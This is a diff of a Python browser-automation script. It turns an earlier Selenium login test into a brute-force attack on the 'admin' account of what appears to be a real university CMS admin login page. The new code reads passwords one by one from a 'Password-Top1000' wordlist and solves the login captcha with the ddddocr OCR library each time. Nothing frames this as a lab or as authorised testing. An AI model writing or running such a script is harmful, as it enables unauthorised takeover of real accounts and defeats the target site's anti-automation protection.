@@ -1,30 +1,42 @@
-import csv  # 导入CSV模块，用于读写CSV文件
-import time  # 导入time模块，用于计时
+import os
 
-from selenium import webdriver  # 导入selenium的webdriver模块，用于驱动浏览器
-from selenium.webdriver.common.by import By  # 导入By类，用于指定元素定位方式
-from selenium.webdriver.support import expected_conditions as EC  # 导入expected_conditions模块，用于设置条件等待
-from selenium.webdriver.support.wait import WebDriverWait  #
+import ddddocr
+from helium import *
+import time
+import requests
+from selenium.webdriver.common.by import By
 
-start_time = time.time()  # 记录开始时间名列表建CSV写入对象
-browser = webdriver.Chrome()  # 创建Chrome浏览器驱动对象
-url = 'https://csab.zju.edu.cn/login'  # 豆瓣电影Top250的URL
-browser.get(url)  # 打开指定URL
-button = browser.find_elements(By.CSS_SELECTOR, '.ivu-btn-primary')  # 查找页码元素
-unput = browser.find_elements(By.CSS_SELECTOR, '.ivu-input-default')
-if __name__ == '__main__':
-    with open('Password-Top1000（1010）.txt') as f:
-        username= unput[0].send_keys('123')
-        password=unput[1].send_keys('234')
-        button[0].click()
-        # imformation = browser.page_source
-        alert = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR, '.ivu-message-error span')))
-        alert_text = alert[0]
-        print("Alert Text:", alert_text)
-        time.sleep(5)
-        # 处理警告框（点击确认按钮）
-        alert.accept()  # 点击确认按钮
+url ="http://www.cms.zju.edu.cn/admin.php?c=Index&a=login"
+driver = helium.start_chrome(url)
+file='Password-Top1000（1010）.txt'
+username_css="#username"
+image= '#checkcode'
+# login = '登录'#or
 
 
-        if '错误' not in alert_text:
-            pass
+def get_image():
+    get_driver().find_element(By.CSS_SELECTOR,image).screenshot(r'./checkcode.png')
+
+def number_verify():
+    get_image()
+    ocr = ddddocr.DdddOcr()
+    verifycode_path = open('checkcode.png', 'rb')
+    img = verifycode_path.read()
+    result = ocr.classification(img)
+    print(result)
+    return result
+
+if __name__=='__main__':
+    with open(file) as f:
+        wait_until(S(username_css).exists)
+        for line in f.readlines():
+            login_button = S('input[type="image"][src="http://www.cms.zju.edu.cn/skin/images/login_btn.jpg"]')
+            write('admin',S(username_css))
+            press(TAB)
+            write(line)
+            press(TAB)
+            write(number_verify())
+            time.sleep(10)
+            press(ENTER)
+            time.sleep(1)
+        kill_browser()
